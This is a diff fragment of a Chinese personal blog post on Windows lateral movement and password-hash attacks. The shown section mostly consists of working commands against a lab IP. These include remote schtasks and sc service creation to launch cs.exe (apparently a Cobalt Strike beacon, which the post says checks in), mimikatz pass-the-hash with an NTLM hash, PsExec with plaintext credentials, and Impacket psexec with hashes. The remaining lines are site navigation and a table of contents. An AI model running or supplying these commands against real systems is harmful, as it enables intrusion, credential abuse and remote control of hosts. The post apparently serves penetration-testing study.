+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image019.png" alt="img"></p>
+<h3 id="高版本windows中schtasks替换at"><a href="#高版本windows中schtasks替换at" class="headerlink" title="高版本windows中schtasks替换at"></a>高版本windows中schtasks替换at</h3><p>创建计划任务</p>
+<p><code>schtasks /s 192.168.21.224 /create /sc once /f /tn note /TR c:\windows\cs.exe /st 20:35:00</code></p>
+<p>查看计划任务</p>
+<p><code>schtasks /s 192.168.21.224 /query /tn note</code></p>
+<p>删除计划任务</p>
+<p><code>schtasks /s 192.168.21.224 /delete /tn note /f</code></p>
+<h3 id="使用sc命令创建服务启动cs-exe"><a href="#使用sc命令创建服务启动cs-exe" class="headerlink" title="使用sc命令创建服务启动cs.exe"></a>使用sc命令创建服务启动cs.exe</h3><p><code>sc \\192.168.21.224 create shell binpath= c:\cs.exe start= auto</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image020.png" alt="img"></p>
+<p>启动服务</p>
+<p><code>sc \\192.168.21.224 start shell</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image021.png" alt="img"></p>
+<p>cs正常上线</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image022.png" alt="img"></p>
+<h2 id="Hash传递"><a href="#Hash传递" class="headerlink" title="Hash传递"></a>Hash传递</h2><h4 id="使用mimikatz-exe通过密码hash创建连接"><a href="#使用mimikatz-exe通过密码hash创建连接" class="headerlink" title="使用mimikatz.exe通过密码hash创建连接"></a>使用mimikatz.exe通过密码hash创建连接</h4><p><code>mimikatz.exe &quot;sekurlsa::pth /domain:192.168.21.224 /user:administrator /ntlm:afffeba176210fad4628f0524bfe1942&quot; &quot;exit&quot;</code></p>
+<p>弹出cmd窗口</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image023.png" alt="img"></p>
+<h3 id="微软pstools"><a href="#微软pstools" class="headerlink" title="微软pstools"></a>微软pstools</h3><p>已建立连接<code>net use \\192.168.21.224\ipc$ 123.com /user:administrator</code></p>
+<p>直接执行命令</p>
+<p><code>PsExec64 -accepteula \\192.168.21.224 whoami</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image024.png" alt="img"></p>
+<p>未创建连接</p>
+<p><code>PsExec -accepteula \\192.168.21.224 -u administrator -p 123.com -s cmd</code></p>
+<p>返回cmd</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image025.png" alt="img"></p>
+<h3 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h3><p>支持hash传递</p>
+<p><code>psexec -hashes 00000000000000000000000000000000:afffeba176210fad4628f0524bfe1942 administrator@192.168.21.224 cmd</code></p>
+<p>返回cmd</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image026.png" alt="img"></p>
 
     </div>
 
@@ -430,7 +412,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/" title="Linux基本命令">https://www.jwmz.net/2021/06/13/Linux基本命令/</a>
+    <a href="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/" title="获取密码hash">https://www.jwmz.net/2021/09/14/获取密码hash/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -447,13 +429,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/06/13/Vmware16%E5%AE%89%E8%A3%85centos6/" rel="prev" title="Vmware16安装centos6">
-      <i class="fa fa-chevron-left"></i> Vmware16安装centos6
+    <a href="/2021/08/02/sql%E6%B3%A8%E5%85%A5/" rel="prev" title="sql注入">
+      <i class="fa fa-chevron-left"></i> sql注入
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2021/06/27/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" rel="next" title="hexo+github搭建个人博客">
-      hexo+github搭建个人博客 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -513,6 +492,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="nav-number">1.</span> <span class="nav-text">获取明文密码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mimikatz"><span class="nav-number">1.1.</span> <span class="nav-text">mimikatz</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%89%A7%E8%A1%8C%EF%BC%9A"><span class="nav-number">1.1.1.</span> <span class="nav-text">本地执行：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%89%A7%E8%A1%8C-%E7%BB%95%E8%BF%87%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90%E9%99%90%E5%88%B6"><span class="nav-number">1.1.2.</span> <span class="nav-text">本地执行(绕过执行权限限制)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C"><span class="nav-number">1.1.3.</span> <span class="nav-text">远程执行</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash"><span class="nav-number">2.</span> <span class="nav-text">获取密码hash</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%AF%BC%E5%87%BAsam%E6%96%87%E4%BB%B6"><span class="nav-number">2.1.</span> <span class="nav-text">注册表导出sam文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Get-PassHashes-ps1%E8%AF%BB%E5%8F%96hash"><span class="nav-number">2.2.</span> <span class="nav-text">Get-PassHashes.ps1读取hash</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E8%AF%BB%E5%8F%96"><span class="nav-number">2.2.1.</span> <span class="nav-text">本地读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E8%AF%BB%E5%8F%96"><span class="nav-number">2.2.2.</span> <span class="nav-text">远程读取</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%98%8E%E6%96%87%E4%BC%A0%E9%80%92"><span class="nav-number">3.</span> <span class="nav-text">明文传递</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%89%A7%E8%A1%8Ccs-exe"><span class="nav-number">3.1.</span> <span class="nav-text">使用计划任务执行cs.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACwindows%E4%B8%ADschtasks%E6%9B%BF%E6%8D%A2at"><span class="nav-number">3.2.</span> <span class="nav-text">高版本windows中schtasks替换at</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8sc%E5%91%BD%E4%BB%A4%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8cs-exe"><span class="nav-number">3.3.</span> <span class="nav-text">使用sc命令创建服务启动cs.exe</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hash%E4%BC%A0%E9%80%92"><span class="nav-number">4.</span> <span class="nav-text">Hash传递</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8mimikatz-exe%E9%80%9A%E8%BF%87%E5%AF%86%E7%A0%81hash%E5%88%9B%E5%BB%BA%E8%BF%9E%E6%8E%A5"><span class="nav-number">4.0.1.</span> <span class="nav-text">使用mimikatz.exe通过密码hash创建连接</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BE%AE%E8%BD%AFpstools"><span class="nav-number">4.1.</span> <span class="nav-text">微软pstools</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Impacket"><span class="nav-number">4.2.</span> <span class="nav-text">Impacket</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
